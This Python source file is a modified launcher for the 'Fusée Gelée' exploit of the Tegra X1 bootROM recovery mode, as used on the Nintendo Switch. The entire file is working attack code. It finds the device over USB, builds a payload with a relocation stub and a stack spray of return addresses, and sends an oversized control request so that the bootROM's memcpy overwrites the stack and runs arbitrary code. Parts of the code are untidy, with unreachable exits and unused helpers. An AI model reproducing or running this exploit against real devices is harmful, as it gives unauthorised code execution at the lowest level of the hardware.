#!/usr/bin/env python3
#
# fusée gelée
#
# Launcher for the {re}switched coldboot/bootrom hacks--
# launches payloads above the Horizon
#
# discovery and implementation by @ktemkin
# likely independently discovered by lots of others <3
#
# this code is political -- it stands with those who fight for LGBT rights
# don't like it? suck it up, or find your own damned exploit ^-^
#
# special thanks to:
#    ScirèsM, motezazer -- guidance and support
#    hedgeberg, andeor  -- dumping the Jetson bootROM
#    TuxSH              -- for IDB notes that were nice to peek at
#
# much love to:
#    Aurora Wright, Qyriad, f916253, MassExplosion213, and Levi
#
# greetings to:
#    shuffle2

# This file is part of Fusée Launcher
# Copyright (C) 2018 Mikaela Szekely <qyriad@gmail.com>
# Copyright (C) 2018 Kate Temkin <k@ktemkin.com>
# Fusée Launcher is licensed under the terms of the GNU GPLv2

import os
import sys
import errno
import platform

# The address where the RCM payload is placed.
# This is fixed for most device.
RCM_PAYLOAD_ADDR    = 0x40010000

# The address where the user payload is expected to begin.
PAYLOAD_START_ADDR  = 0x40010E40

# Specify the range of addresses where we should inject oct
# payload address.
STACK_SPRAY_START   = 0x40014E40
STACK_SPRAY_END     = 0x40017000

RCM_VID = 0x0955
RCM_PID = 0x7321
# notes:
# GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
# GET_INTERFACE  to the INTERFACE triggers memcpy from 0x40003984
# GET_STATUS     to the ENDPOINT  triggers memcpy from <on the stack>




class Backend:
    """
    Simple vulnerability trigger for macOS: we simply ask libusb to issue
    the broken control request, and it'll do it for us. :)

    We also support platforms with a hacked libusb and FreeBSD.
    """

    # USB constants used
    STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT = 0x82
    STANDARD_REQUEST_DEVICE_TO_HOST   = 0x80
    GET_DESCRIPTOR    = 0x6
    GET_CONFIGURATION = 0x8

    # Interface requests
    GET_STATUS        = 0x0

    # List of OSs this class supports.
    SUPPORTED_SYSTEMS = []

    BACKEND_NAME = "macOS"
    SUPPORTED_SYSTEMS = ['Darwin', 'libusbhax', 'macos', 'FreeBSD']

    
    def __init__(self, skip_checks=False):
        """ Sets up the backend for the given device. """
        self.skip_checks = skip_checks


    def print_warnings(self):
        """ Print any warnings necessary for the given backend. """
        pass


    def trigger_vulnerability(self, length):

        # Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
        return self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length)


    @classmethod
    def supported(cls, system_override=None):
        """ Returns true iff the given backend is supported on this platform. """

        # If we have a SYSTEM_OVERRIDE, use it.
        if system_override:
            system = system_override
        else:
            system = platform.system()

        return system in cls.SUPPORTED_SYSTEMS


    @classmethod
    def create_appropriate_backend(cls, system_override=None, skip_checks=False):
        """ Creates a backend object appropriate for the current OS. """

        # Search for a supportive backend, and try to create one.
        for subclass in cls.__subclasses__():
            if subclass.supported(system_override):
                return subclass(skip_checks=skip_checks)

        # ... if we couldn't, bail out.
        raise IOError("No backend to trigger the vulnerability-- it's likely we don't support your OS!")


    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return bytes(self.dev.read(0x81, length, 1000))


    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be 0x1000 long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        return self.dev.write(0x01, data, 1000)


    

    def find_device(self, vid=None, pid=None):
        """ Set and return the device to be used """
        def local(name: str):
                __location__ = os.path.realpath(
                    os.path.join(os.getcwd(), os.path.dirname(__file__)))

                return os.path.join(__location__, name)
        
        # statically link LibUSB
        import usb
        import usb.backend.libusb1
        libr = 'assets/libusb.lib'

        backend = usb.backend.libusb1.get_backend(find_library=lambda x: libr)
        self.dev = usb.core.find(backend=backend, idVendor=vid, idProduct=pid)
        return self.dev


def cr_find_device(vid=None, pid=None):
    """ Attempts to get a connection to the RCM device with the given VID and PID.d """
    # ... and use them to find a USB device.
    return our_backend.find_device(vid, pid)



our_backend = Backend()


class RCMHax:

    # Default to the Nintendo Switch RCM VID and PID.
    DEFAULT_VID = 0x0955
    DEFAULT_PID = 0x7321

    # Exploit specifics
    COPY_BUFFER_ADDRESSES   = [0x40005000, 0x40009000]   # The addresses of the DMA buffers we can trigger a copy _from_.
    STACK_END               = 0x40010000                 # The address just after the end of the device's stack.

    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
        """ Set up our RCM hack connection."""

        # The first write into the bootROM touches the lowbuffer.
        self.current_buffer = 0

        # Keep track of the total amount written.
        self.total_written = 0

        # Create a vulnerability backend for the given device.
        try:
            self.backend = Backend()
        except IOError:
            print("It doesn't look like we support your OS, currently. Sorry about that!\n")
            sys.exit(-1)

        # Grab a connection to the USB device itself.
        self.dev = self._find_device(vid, pid)

        # If we don't have a device...
        if self.dev is None:

            # ... and we're allowed to wait for one, wait indefinitely for one to appear...
            if wait_for_device:
                print("Waiting for a TegraRCM device to come online...")
                while self.dev is None:
                    self.dev = self._find_device(vid, pid)

            # ... or bail out.
            else:
                raise IOError("No TegraRCM device found?")

        # Print any use-related warnings.
        self.backend.print_warnings()

        # Notify the user of which backend we're using.
        #print("Identified a {} system; setting up the appropriate backend.".format(self.backend.BACKEND_NAME))


    def _find_device(self, vid=None, pid=None):
        """ Attempts to get a connection to the RCM device with the given VID and PID.d """
        # Apply our default VID and PID if neither are provided...
        vid = vid if vid else self.DEFAULT_VID
        pid = pid if pid else self.DEFAULT_PID

        # ... and use them to find a USB device.
        return self.backend.find_device(vid, pid)

    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return self.backend.read(length)


    def write(self, data):
        """ Writes data to the main RCM protocol endpoint. """

        length = len(data)
        packet_size = 0x1000

        while length:
            data_to_transmit = min(length, packet_size)
            length -= data_to_transmit

            chunk = data[:data_to_transmit]
            data  = data[data_to_transmit:]
            self.write_single_buffer(chunk)


    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be 0x1000 long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        self._toggle_buffer()
        return self.backend.write_single_buffer(data)


    def _toggle_buffer(self):
        """
        Toggles the active target buffer, paralleling the operation happening in
        RCM on the X1 device.
        """
        self.current_buffer = 1 - self.current_buffer


    def get_current_buffer_address(self):
        """ Returns the base address for the current copy. """
        return self.COPY_BUFFER_ADDRESSES[self.current_buffer]


    def read_device_id(self):
        """ Reads the Device ID via RCM. Only valid at the start of the communication. """
        return self.read(16)


    def switch_to_highbuf(self):
        """ Switches to the higher RCM buffer, reducing the amount that needs to be copied. """

        if self.get_current_buffer_address() != self.COPY_BUFFER_ADDRESSES[1]:
            self.write(b'\0' * 0x1000)


    def trigger_controlled_memcpy(self, length=None):
        """ Triggers the RCM vulnerability, causing it to make a signficantly-oversized memcpy. """

        # Determine how much we'd need to transmit to smash the full stack.
        if length is None:
            length = self.STACK_END - self.get_current_buffer_address()

        return self.backend.trigger_vulnerability(length)


def parse_usb_id(id):
    """ Quick function to parse VID/PID arguments. """
    return int(id, 16)

def try_push(target_payload, arguments):
        # Read our arguments.
    
    


    # Find our intermezzo relocator...
    intermezzo_path = "assets/intermezzo.bin"
    if not os.path.isfile(intermezzo_path):
        print("Could not find the intermezzo interposer. Did you build it?")
        return 2
        sys.exit(-1)

    # Get a connection to our device.
    try:
        switch = RCMHax(wait_for_device=False, vid=RCM_VID, 
                pid=RCM_PID,  override_checks=False)
    except IOError as e:
        print(e)
        sys.exit(-1)

    # Print the device's ID. Note that reading the device's ID is necessary to get it into
    try:
        device_id = switch.read_device_id()
        print("Found a Tegra with Device ID: {}".format(device_id))
    except OSError as e:
        return 4


    # Prefix the image with an RCM command, so it winds up loaded into memory
    # at the right location (0x40010000).

    # Use the maximum length accepted by RCM, so we can transmit as much payload as
    # we want; we'll take over before we get to the end.
    length  = 0x30298
    payload = length.to_bytes(4, byteorder='little')

    # pad out to 680 so the payload starts at the right address in IRAM
    payload += b'\0' * (680 - len(payload))

    # Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
    # We'll use this data to smash the stack when we execute the vulnerable memcpy.
    print("\nSetting ourselves up to smash the stack...")

    # Include the Intermezzo binary in the command stream. This is our first-stage
    # payload, and it's responsible for relocating the final payload to 0x40010000.
    intermezzo_size = 0
    with open(intermezzo_path, "rb") as f:
        intermezzo      = f.read()
        intermezzo_size = len(intermezzo)
        payload        += intermezzo


    # Pad the payload till the start of the user payload.
    padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
    payload += (b'\0' * padding_size)


    # Fit a collection of the payload before the stack spray...
    padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
    payload += target_payload[:padding_size]

    # ... insert the stack spray...
    repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
    payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)

    # ... and follow the stack spray with the remainder of the payload.
    payload += target_payload[padding_size:]

    # Pad the payload to fill a USB request exactly, so we don't send a short
    # packet and break out of the RCM loop.
    payload_length = len(payload)
    padding_size   = 0x1000 - (payload_length % 0x1000)
    payload += (b'\0' * padding_size)

    # Check to see if our payload packet will fit inside the RCM high buffer.
    # If it won't, error out.
    if len(payload) > length:
        size_over = len(payload) - length
        print("ERROR: Payload is too large to be submitted via RCM. ({} bytes larger than max).".format(size_over))
        return 1
        sys.exit(errno.EFBIG)

    # Send the constructed payload, which contains the command, the stack smashing
    # values, the Intermezzo relocation stub, and the final payload.
    print("Uploading payload...")
    switch.write(payload)

    # The RCM backend alternates between two different DMA buffers. Ensure we're
    # about to DMA into the higher one, so we have less to copy during our attack.
    switch.switch_to_highbuf()

    # Smash the device's stack, triggering the vulnerability.
    print("Smashing the stack...")
    try:
        switch.trigger_controlled_memcpy()
    except ValueError as e:
        print(str(e))
    except IOError:
        print("The USB device stopped responding-- sure smells like we've smashed its stack. :)")
        print("Launch complete!")
        return 0

